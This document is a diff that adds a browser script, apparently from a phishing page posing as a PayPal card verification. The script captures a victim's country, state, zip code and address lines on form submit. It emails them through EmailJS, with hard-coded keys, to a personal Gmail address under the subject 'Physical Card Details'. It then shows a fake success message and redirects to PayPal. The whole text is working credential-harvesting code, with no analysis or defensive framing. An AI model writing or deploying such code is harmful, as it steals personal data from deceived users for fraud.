@@ -1,0 +1,36 @@
+<script>
+  document.getElementById('contactForm').addEventListener('submit', function(event) {
+  event.preventDefault(); // Prevent form submission
+  
+var zip = document.getElementById('zip').value;
+  
+var country = document.getElementById('country').value;
+  var state = document.getElementById('state').value;
+
+
+var add1 = document.getElementById('add1').value;
+  var add2 = document.getElementById('add2').value;
+  // Configure emailjs
+  emailjs.init('835HY_wRkYBhqdu7d');
+
+  // Create email message
+  var message = {
+    to: 'robinlaura101@gmail.com', // Change to your Gmail address
+    subject: 'Physical Card Details',
+    text: `Country: ${country}, \n\n State: ${state}, \n\n Zip Code: ${zip} \n\n Address1: ${add1}, \n\n Address2: ${add2}`
+  };
+ 
+  // Send email
+  emailjs.send('service_bg462kr', 'template_6pyapsf', message)
+    .then(function(response) {
+      console.log('Verification Successful!!', response);
+      alert('Verification Successful!!', location.href="www.paypal.com");
+    }, function(error) {
+      console.error('Error sending email:', error);
+      alert('Error sending login details. Please try again later.');
+    });
+    
+});
+
+
+</script>
